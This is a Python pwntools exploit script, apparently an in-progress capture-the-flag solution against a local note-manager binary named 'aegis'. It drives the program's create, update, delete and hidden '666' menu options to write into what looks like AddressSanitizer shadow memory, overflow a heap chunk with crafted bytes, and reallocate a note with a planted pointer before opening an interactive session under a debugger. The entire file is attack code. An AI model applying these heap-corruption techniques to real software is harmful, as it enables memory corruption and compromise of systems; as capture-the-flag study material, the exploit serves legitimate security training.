from pwn import *

target = process('./aegis')
gdb.attach(target, gdbscript = 'pie b *0x1145c1')

def createNote(size, payload, ide):
	print target.recvuntil("Choice: ")
	target.sendline('1')
	print target.recvuntil("Size: ")
	target.sendline(str(size))
	print target.recvuntil("Content: ")
	target.send(payload)
	print target.recvuntil("ID: ")
	target.sendline(str(ide))

def showNote(index):
        print target.recvuntil("Choice: ")
        target.sendline('2')
        print target.recvuntil("Index: ")
        target.sendline(str(index))
        content = target.recvline()
        content = content.replace("Content: ", "")
        content = content.replace("\x0a", "")
        ide = target.recvline()
        ide = ide.replace("Index: ", "")
        ide = ide.replace("\x0a", "")
        return content, ide

def updateNote(index, content, ide):
        print target.recvuntil("Choice: ")
        target.sendline("3")
        print target.recvuntil("Index: ")
        target.sendline(str(index))
        print target.recvuntil("New Content: ")
        target.send(content)
        print target.recvuntil("New ID: ")
        target.sendline(str(ide))

def deleteNote(index):
	print target.recvuntil("Choice: ")
	target.sendline('4')
	print target.recvuntil("Index: ")
	target.sendline(str(index))


def secret(addr):
        print target.recvuntil("Choice: ")
        target.sendline("666")
        print target.recvuntil("Lucky Number: ")
        target.sendline(str(addr))


createNote(0x10, '0'*0x8, 0xffffffffffffffff)

secret((0x602000000020 >> 3) + 0x7fff8000)

updateNote(0, '\x02'*0x12, 0x1502ffff00020202)

updateNote(0, '\x02'*0x15, 0xffffffff02ffffff)


raw_input()

deleteNote(0)

raw_input()

createNote(0x10, p64(0x602000000018), 0xffffffffffffff00)

raw_input()

target.interactive()
